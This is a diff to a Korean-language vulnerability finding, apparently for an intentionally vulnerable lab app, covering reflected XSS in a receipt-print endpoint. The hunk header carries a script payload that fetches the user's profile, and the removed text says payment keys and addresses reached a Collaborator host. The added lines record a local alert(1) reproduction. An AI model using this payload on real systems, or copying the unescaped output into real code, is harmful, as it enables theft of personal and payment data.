@@ -28,7 +28,9 @@ GET /api/java/orders/1/receipt/print?note=<script>fetch('/api/java/profile').the
 
 ## 증거 (재현 확인)
 
-(진단 단계에서 채움) 피해자 계정 세션에서 위 링크 접근 → Collaborator 로 해당 사용자의 `tossPaymentKey` 및 주소가 도착.
+2026-09-01, 로컬 재현 확인(`:8090`, `user1`, 소유 주문 #92): `GET /orders/92/receipt/print?note=<script>alert(1)</script>`
+응답 HTML에 `<script>alert(1)</script>`가 이스케이프 없이 그대로 삽입됨(최상위 HTML 문서라 실행됨).
+피해자 세션에서 열면 그 세션으로 임의 요청(PII·주문 `tossPaymentKey` 유출) 가능.
 
 ## 조치 상태: 미조치 (의도된 취약점)
 
